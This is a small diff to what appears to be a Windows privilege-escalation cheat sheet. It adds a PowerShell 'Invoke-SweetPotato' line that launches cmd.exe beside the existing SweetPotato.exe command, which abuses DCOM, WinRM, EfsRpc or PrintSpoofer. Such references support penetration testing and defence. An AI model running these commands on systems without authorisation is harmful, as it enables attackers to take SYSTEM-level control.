@@ -371,6 +371,7 @@ Win7 - Win10/2008R2/2012/2016
 Win10/2016/2019  
 
 	./SweetPotato.exe -p cmd -e [DCOM|WinRM|EfsRpc|PrintSpoofer]
+	Invoke-SweetPotato -Binary 'C:/Windows/System32/cmd.exe'
 Win7 - Win10/2019  
 
 ## Windows - SeBackupPrivilege
